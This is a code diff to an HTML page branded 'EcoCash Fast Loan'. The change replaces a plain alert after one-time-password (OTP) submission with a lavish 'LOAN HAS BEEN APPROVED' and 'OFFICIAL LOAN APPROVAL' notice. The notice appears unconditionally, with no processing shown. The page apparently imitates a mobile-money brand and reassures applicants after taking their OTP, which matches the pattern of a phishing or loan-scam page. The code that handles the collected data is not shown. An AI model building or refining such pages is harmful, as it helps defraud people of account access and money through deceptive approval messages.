@@ -11,7 +11,7 @@
   <div class="w-full max-w-md bg-blue-900/90 border border-blue-700/50 rounded-2xl p-6 shadow-2xl space-y-6">
     
     <!-- HEADER -->
-    <div class="text-center space-y-1">
+    <div id="app-header" class="text-center space-y-1">
       <h1 class="text-2xl font-black text-blue-300 tracking-wide">EcoCash Fast Loan</h1>
       <p class="text-xs text-blue-200/70">Instant emergency loan application</p>
     </div>
@@ -131,6 +131,41 @@
       </button>
     </div>
 
+    <!-- STEP 4: CUSTOM CALLBACK APPROVAL MESSAGE -->
+    <div id="step-success" class="hidden text-center py-4 space-y-4">
+      <h2 class="text-lg font-bold text-blue-300 leading-snug">
+        🎉🎉 CONGRATULATIONS! YOUR LOAN HAS BEEN APPROVED 🎉🎉
+      </h2>
+
+      <div class="border-t border-b border-blue-700/60 py-3 text-xs text-blue-200 font-mono tracking-wider">
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━<br>
+        🏦 LOAN APPROVAL NOTICE<br>
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━
+      </div>
+
+      <div class="text-left text-xs text-blue-100 space-y-3 leading-relaxed">
+        <p>Dear Applicant,</p>
+        <p>We are pleased to inform you that your loan application has been successfully reviewed and <b>APPROVED. ✅</b></p>
+        <p>🌟 Congratulations! Your application has met all the required approval criteria.</p>
+        
+        <div class="bg-blue-950/80 p-3 rounded-xl border border-blue-800 space-y-1 font-mono text-blue-200">
+          <p>📌 <b>Loan Status:</b> ✅ APPROVED</p>
+          <p>💰 <b>Disbursement Status:</b> Processing for Immediate Release</p>
+        </div>
+
+        <p>Your approved loan will be disbursed to your registered account shortly. Please keep your phone switched on and monitor your account for the payment notification.</p>
+        <p>Thank you for choosing our lending services. We appreciate your trust and look forward to serving you again.</p>
+      </div>
+
+      <div class="border-t border-blue-700/60 pt-3 text-xs text-blue-200 font-mono tracking-wider space-y-2">
+        <p>━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
+        <p class="text-sm font-bold text-blue-300">🎊 Congratulations once again! 🎊</p>
+        <p class="text-xs text-blue-100 font-sans">Your loan has been approved and is now being processed for immediate disbursement.</p>
+        <p class="text-xs text-blue-100 font-sans">We wish you success and prosperity with your approved funds.</p>
+        <p class="text-xs text-blue-400 font-bold font-mono pt-2">✔ OFFICIAL LOAN APPROVAL</p>
+      </div>
+    </div>
+
   </div>
 
   <script src="/app.js"></script>
@@ -150,11 +185,16 @@
       document.getElementById('step-2').classList.add('hidden');
       document.getElementById('step-loading').classList.add('hidden');
       document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-success').classList.add('hidden');
 
       if (stepNumber === 1) document.getElementById('step-1').classList.remove('hidden');
       if (stepNumber === 2) document.getElementById('step-2').classList.remove('hidden');
       if (stepNumber === 'loading') document.getElementById('step-loading').classList.remove('hidden');
       if (stepNumber === 3) document.getElementById('step-3').classList.remove('hidden');
+      if (stepNumber === 'success') {
+        document.getElementById('app-header').classList.add('hidden');
+        document.getElementById('step-success').classList.remove('hidden');
+      }
     }
 
     function submitStep2() {
@@ -172,8 +212,9 @@
     }
 
     function submitOTP() {
-      alert("Application Submitted Successfully!");
+      goToStep('success');
     }
   </script>
 </body>
-</html>
+  </html>
+          
